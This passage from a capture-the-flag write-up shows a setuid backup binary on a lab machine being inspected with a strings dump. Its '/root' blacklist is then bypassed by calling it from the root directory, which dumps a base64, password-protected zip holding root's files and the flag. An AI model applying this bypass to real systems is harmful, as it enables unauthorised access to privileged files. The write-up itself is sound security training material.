P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
28  0x00001ec5 0x08049ec5 5    6    .rodata ascii   /root
29  0x00001ecc 0x08049ecc 12   26   .rodata utf16le //支捴⼀浴⽰戮捡畫彰椥 blocks=Basic Latin,CJK Unified Ideographs,Kangxi Radicals
30  0x00001ee8 0x08049ee8 46   47   .rodata ascii   /usr/bin/zip -r -P magicword %s %s > /dev/null
31  0x00001f17 0x08049f17 22   23   .rodata ascii   /usr/bin/base64 -w0 %s
32  0x00001f2e 0x08049f2e 29   30   .rodata ascii   The target path doesn't exist
```
I can also see the string /root is present, however using it with a key seems out only output the hardcoded base64 zip with trollface text.

### 11. Get the root flag
Because the binary is only blacklisting /root, I can try calling it from the / directory so I only have to specify "root".
```bash
tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec3 root
UEsDBAoAAAAAABwWO0sAAAAAAAAAAAAAAAAFABwAcm9vdC9VVAkAA4cDy1kNHgFgdXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIANGDEUd/sK5kgwAAAJQAAAANABwAcm9vdC8ucHJvZmlsZVVUCQADGf7RVQ0eAWB1eAsAAQQAAAAABAAAAADtS5Er7OvgMQTuXH6gFh3FSwsrXgMS+LYRzSxowhsz/HNj3LiHDB4w9zyiBTeIBlXW3vxikG3bNkybouU+UqcQIRu6Idlw3c2nT6TrplF8L2MCl4wNt/rdFFGvb1wYuw2YEGYmF7hD5xvgukDWWdQtGEmt6kGjXvBki80ho27CH9LONVBLBwh/sK5kgwAAAJQAAABQSwMEFAAJAAgAHBY7S9xSZRxNAAAAVQAAABIAHAByb290Ly5iYXNoX2hpc3RvcnlVVAkAA4cDy1kNHgFgdXgLAAEEAAAAAAQAAAAAd8bXf21ViHMUNSNrsOhP0AvJDfuecKSNoux3EyHjc/+cdrG3ruaMLxH4imC3XtMtPzNyaq71DLnNTguTv0M0TkuJScoT0L+7pHdZGGBQSwcI3FJlHE0AAABVAAAAUEsDBAoAAAAAADR8I0sAAAAAAAAAAAAAAAAMABwAcm9vdC8uY2FjaGUvVVQJAAPDEqxZDR4BYHV4CwABBAAAAAAEAAAAAFBLAwQKAAkAAAA0fCNLAAAAAAwAAAAAAAAAIAAcAHJvb3QvLmNhY2hlL2...
```
They resulting base64 can be decoded into a zip file, which is then decrypted to give the root flag.

```
